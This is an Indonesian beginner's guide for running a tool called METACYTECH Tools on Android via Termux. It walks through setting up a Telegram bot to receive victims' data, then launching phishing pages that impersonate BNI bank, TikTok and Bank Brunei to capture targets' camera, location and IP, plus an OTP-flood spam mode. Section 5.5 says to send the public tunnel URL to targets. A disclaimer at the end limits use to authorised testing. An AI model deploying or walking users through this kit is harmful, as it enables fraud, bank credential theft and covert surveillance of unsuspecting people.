# METACYTECH Tools — Panduan Lengkap Termux (HP Android)

> **Target pembaca:** Pemula — langkah demi langkah dari nol sampai dapat URL publik.
> 
> **Perkiraan waktu:** 15-30 menit (tergantung kecepatan internet HP).

---

## Daftar Isi

1. [Persiapan Awal](#1-persiapan-awal)
2. [Install Bahan-Bahan](#2-install-bahan-bahan)
3. [Clone Project](#3-clone-project)
4. [Setup Telegram (Wajib)](#4-setup-telegram-wajib)
5. [Jalankan Tool](#5-jalankan-tool)
6. [Troubleshooting](#6-troubleshooting)
7. [Referensi Cepat](#7-referensi-cepat)

---

## 1. Persiapan Awal

### 1.1 Install Termux

1. Buka Google Play Store atau F-Droid
2. Cari **"Termux"**
3. Install

> [!TIP]
> **Gunakan Termux dari F-Droid** (termux.com) — versi Play Store sering kedaluwarsa.

### 1.2 Buka Termux

Buka aplikasi Termux. Layar akan hitam dengan kursor berkedip — itu terminal.

### 1.3 Update Termux

Ketik perintah ini satu per satu (tekan Enter setelah setiap baris):

```bash
pkg update -y
pkg upgrade -y
```

Tunggu sampai selesai (bisa 2-5 menit). Ketik `Y` atau `y` jika diminta konfirmasi.

### 1.4 Beri Izin Storage

Termux butuh akses ke penyimpanan HP:

```bash
termux-setup-storage
```

Akan muncul popup di HP — tekan **"Izinkan"** atau **"Allow"**.

---

## 2. Install Bahan-Bahan

Jalankan perintah ini satu per satu. Biarkan selesai sebelum lanjut.

### 2.1 Python

```bash
pkg install python -y
```

Cek:

```bash
python --version
```

Harus muncul: `Python 3.13.x` atau lebih baru.

### 2.2 Node.js

```bash
pkg install nodejs-lts -y
```

Cek:

```bash
node --version
npm --version
```

Harus muncul versi (contoh: `v22.x.x` dan `10.x.x`).

### 2.3 Git

```bash
pkg install git -y
```

### 2.4 Cloudflared (Tunnel — biar dapat URL publik)

```bash
pkg install cloudflared -y
```

Cek:

```bash
cloudflared --version
```

Harus muncul versi (contoh: `2026.x.x`).

### 2.5 Python Dependencies

```bash
pip install requests qrcode
```

---

## 3. Clone Project

Pindah ke storage internal:

```bash
cd ~/storage/downloads
```

Clone project dari GitHub:

```bash
git clone https://github.com/iqbalgsr46/metacytech-tools.git
```

Masuk ke folder project:

```bash
cd metacytech-tools
```

---

## 4. Setup Telegram (Wajib)

> [!WARNING]
> **Tanpa Telegram, data target tidak akan terkirim ke mana-mana.**
> Kamera, lokasi, IP — semua terkirim lewat Telegram.

### 4.1 Buat Bot Telegram

1. Buka Telegram di HP lain
2. Cari **@BotFather**
3. Kirim perintah: `/newbot`
4. Ikuti instruksi — nanti dapat **Bot Token** (format: `123456:ABC-DEF...`)
5. Simpan token-nya

### 4.2 Dapatkan Chat ID

1. Buat grup baru di Telegram
2. Masukkan bot tadi ke grup (jadikan admin)
3. Kirim pesan apa saja ke grup (misalnya "test")
4. Buka link ini di browser (ganti `<TOKEN>` punya kamu):
   ```
   https://api.telegram.org/bot<TOKEN>/getUpdates
   ```
5. Cari angka `"chat":{"id":` — itu Chat ID-nya (contoh: `-100123456789`)

### 4.3 Buat File Konfigurasi

Di Termux, jalankan:

```bash
nano .env.local
```

Copy-paste ini (ganti token dan chat id punya kamu):

```env
TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
TELEGRAM_CHAT_ID=-100123456789
```

Tekan:
- **Ctrl+X** (keluar)
- **Y** (simpan)
- **Enter** (konfirmasi nama file)

---

## 5. Jalankan Tool

### 5.1 Metode termudah — pakai run.sh

```bash
bash run.sh
```

Script ini akan:
- Install npm dependencies otomatis
- Deteksi Termux + install cloudflared
- Jalankan launcher Python

### 5.2 Atau manual — pakai Python

```bash
python launcher.py
```

### 5.3 Pilih Template

```
  Pilih template (1-4): 2
```

| Nomor | Template | Fungsi |
|-------|----------|--------|
| 1 | BNI | Transfer Bank Verification |
| 2 | TikTok | Video Share Link (kamera + lokasi) |
| 3 | BIBD | Bank Brunei Darussalam |
| 4 | OTP Flood | Spam OTP multi-brand |

Jika pilih **TikTok** (nomor 2), kamu akan diminta **Custom Title**:

```
  Title URL: TikTok - Free ChatGpt Pro
```

Bisa dikosongkan untuk default.

### 5.4 Tunggu Proses

Tool akan otomatis:

1. **Applying template** — Copy file template
2. **Building** — Build Next.js (bisa lambat 3-10 menit di HP — sabar)
3. **Starting server** — Jalankan server di port 3000
4. **Starting tunnel** — Dapatkan URL publik lewat Cloudflare Tunnel

> [!NOTE]
> **Build pertama biasanya lambat** (5-15 menit) karena harus compile semua dependensi. Build selanjutnya lebih cepat karena sudah tersimpan di cache.

Kalau berhasil, akan muncul:

```
  url  https://xxxx-xxxx-xxxx-xxxx.trycloudflare.com
  local  http://localhost:3000
```

### 5.5 Bagikan URL

- **URL** itu yang kamu bagikan ke target
- Saat target buka link itu, mereka akan lihat halaman TikTok/BNI/BIBD
- Setelah target izinkan kamera/lokasi, data langsung terkirim ke Telegram kamu

### 5.6 Menu Operasi

```
  [1]  Mulai Semua       — Build + Server + Tunnel
  [2]  Hentikan Semua     — Matikan semua
  [3]  Status             — Cek apakah server/tunnel jalan
  [4]  Salin URL          — Salin URL publik
  [5]  Ganti Template     — Ganti BNI/TikTok/BIBD
  [6]  Keluar             — Stop semua + keluar
```

---

## 6. Troubleshooting

### ❌ "Python tidak ditemukan"

```bash
pkg install python -y
```

### ❌ "Node.js tidak ditemukan"

```bash
pkg install nodejs-lts -y
```

### ❌ Build error: Turbopack tidak support ARM

**Masalah:** Next.js 16 (Turbopack) tidak berjalan di ARM64 (kebanyakan HP Android).

**Solusi:** Launcher akan otomatis downgrade ke Next.js 15 (Webpack) saat mendeteksi Termux.
Tapi build akan lebih lambat. Sabar tunggu 5-15 menit.

### ❌ Build terlalu lama

Ini normal di HP kelas menengah ke bawah. Beberapa tips:

- Tutup aplikasi lain biar RAM lega
- Pastikan HP nggak overheating
- Kalau stuck, bunuh proses (Ctrl+C), hapus `node_modules` dan `package-lock.json`:
  ```bash
  rm -rf node_modules package-lock.json
  python launcher.py
  ```
- Kalau masih lama, coba pake **OTP Flood mode** (template [4]) — tidak perlu build server.

### ❌ Cloudflare Tunnel gagal

Jika cloudflared gagal, tool auto-fallback ke **ngrok**.

Tapi kalau dua-duanya gagal, install manual ngrok:

```bash
pkg install wget -y
cd ~
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
unzip ngrok-v3-stable-linux-arm64.zip
chmod +x ngrok
mv ngrok $PREFIX/bin/
ngrok config add-authtoken <TOKEN_KAMU>
```

Daftar gratis di [ngrok.com](https://ngrok.com) untuk dapat authtoken.

### ❌ Telegram tidak kirim data

Cek file `.env.local`:

```bash
cat .env.local
```

Pastikan isinya benar:

```env
TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
TELEGRAM_CHAT_ID=-100123456789
```

Test kirim pesan manual:

```bash
curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=Test"
```

### ❌ Port 3000 sudah dipakai

```bash
pkill -9 -f "node"
pkill -9 -f "next"
```

Lalu jalankan ulang.

### ❌ "No space left on device"

Cache npm dan pip bisa membesar. Bersihkan:

```bash
pkg clean
pip cache purge
rm -rf ~/.npm/_cacache
```

---

## 7. Referensi Cepat

### Install dari Nol (Semua Perintah)

```bash
# 1. Update
pkg update -y && pkg upgrade -y

# 2. Install semua
pkg install -y python nodejs-lts git cloudflared

# 3. Python deps
pip install requests qrcode

# 4. Clone project
cd ~/storage/downloads
git clone https://github.com/iqbalgsr46/metacytech-tools.git
cd metacytech-tools

# 5. Setup Telegram — EDIT dulu .env.local (lihat bagian 4.3)
nano .env.local

# 6. Jalankan
bash run.sh
```

### Perintah Penting

| Perintah | Fungsi |
|----------|--------|
| `bash run.sh` | Jalankan tool (auto install) |
| `python launcher.py` | Jalankan tool langsung |
| `nano .env.local` | Edit konfigurasi Telegram |
| `cat .env.local` | Lihat konfigurasi Telegram |
| `pkill -9 -f node` | Matikan semua proses Node.js |
| `pkill -9 -f cloudflared` | Matikan tunnel |
| `rm -rf node_modules package-lock.json` | Reset npm modules |
| `git pull` | Update ke versi terbaru |

### Update Tool ke Versi Terbaru

```bash
cd ~/storage/downloads/metacytech-tools
git pull
bash run.sh
```

---

> [!CAUTION]
> **Gunakan hanya untuk edukasi dan authorized security testing.**
> Tanpa izin tertulis dari target = ILEGAL (UU ITE Pasal 30-35).
> Segala penyalahgunaan adalah tanggung jawab pengguna sepenuhnya.